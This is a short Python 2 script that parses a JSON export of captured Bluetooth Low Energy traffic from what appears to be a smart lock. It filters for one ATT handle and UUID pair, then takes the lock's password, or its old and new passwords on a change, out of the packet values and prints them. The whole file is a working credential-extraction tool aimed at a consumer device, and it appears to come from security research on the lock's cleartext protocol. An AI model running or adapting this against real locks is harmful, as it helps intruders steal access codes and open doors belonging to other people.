import json
from pprint import pprint


desired_handle = "0x0000002d"
desired_serviceUUID = "65488"
desired_uuid = "65494"

with open("lockPackets/lockPacketInfo.json") as data_file:
    data = json.load(data_file)

btattValues = []
for dataPoint in data:
    try:
        if (dataPoint["_source"]["layers"]["btatt"]["btatt.handle"] ==
            desired_handle and dataPoint["_source"]["layers"]["btatt"]["btatt.handle_tree"]["btatt.service_uuid16"]
            == desired_serviceUUID and dataPoint["_source"]["layers"]["btatt"]["btatt.handle_tree"]["btatt.uuid16"]
            == desired_uuid):
            


            #print("######FOUND IT########")
            #pprint(dataPoint["_source"]["layers"]["frame"]["frame.number"])
            btattValue = dataPoint["_source"]["layers"]["btatt"]["btatt.value"] 
            btattValues.append(btattValue)

    except Exception as e:
        pass
        #print(e)
    

if not btattValues:
    print "No Password Captured"
else:
    for btattValue in btattValues:
        btattValue = str(btattValue)
        opcode = btattValue.split(':')[0]
        oldPassword = "".join(btattValue.split(':')[1:4])
        newPassword = "".join(btattValue.split(':')[5:8])

        if opcode == "01":
            print "Password Change Captured!\nOpcode: " + opcode +  "\nOld Password: " + oldPassword + "\nNew Password: " + newPassword + "\n"
        elif opcode == "00":
            print "Password Captured!\nOpcode: " + opcode +  "\nPassword: " + newPassword + "\n"
